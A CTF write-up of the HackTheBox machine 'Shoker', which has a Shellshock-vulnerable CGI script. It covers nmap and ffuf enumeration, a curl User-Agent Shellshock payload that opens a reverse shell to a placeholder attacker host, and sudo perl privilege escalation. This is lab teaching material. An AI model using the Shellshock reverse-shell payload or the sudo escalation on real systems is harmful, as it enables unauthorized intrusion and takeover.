---
title: Shoker
date: 2020-11-28 07:10:10 +/-TTTT
categories: [CTF, hackthebox]
tags: [sudo, shellshock]
---

## Enumeration

![info card](/assets/htb/shoker/infocard.png)

Shoker is an easy box and by the name, we can guess that it has shellshock vulnerability. which allow attacker to remotely execute code on system. its found in unix bash shell so it can be found every linux unix system. and for privs we can use sudo.


as always we start with Nmap scan.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 10:28 EST
Nmap scan report for 10.10.10.56
Host is up (0.39s latency).

PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp  open   ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
25000/tcp closed icl-twobase1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds

```

We have port 80 open so lets check webpage first.

![webpage](/assets/htb/shoker/webpage.png)

nothing interested here. lets find out direcotories for webpage by using ffuf.

![fuff](/assets/htb/shoker/fuff.png)

we got `cgi-bin` and when we recursivelly scan `/cgi-bin` for `.bin`,`.sh`,`cgi` extentions, we got `user.sh`.

![user](/assets/htb/shoker/user.png)

## Gaining Shell

We have to craft payload to gain shell on the box.

`curl -A “() { :; }; /bin/bash -i > /dev/tcp/attacker_ip/port 0<&1 2>&1” http://10.10.10.56/cgi-bin/user.sh`

`/bin/bash -i` : defind that shell must be interactive.

`> /dev/tcp/attacker_ip/port` : this will redirect the output of the shell to attacker via tcp connection.

`0<&1 2>&1` : its basically indicates that input coming from a TCP connection, and output going to the same TCP connection.

by this payload we can get shell on the box.

![user flag](/assets/htb/shoker/userflag.png)

## Getting Root

its easy to escalate privs in this box we can run perl as root.

`sudo perl -e 'exec "/bin/sh";'` 

![root](/assets/htb/shoker/root.png)


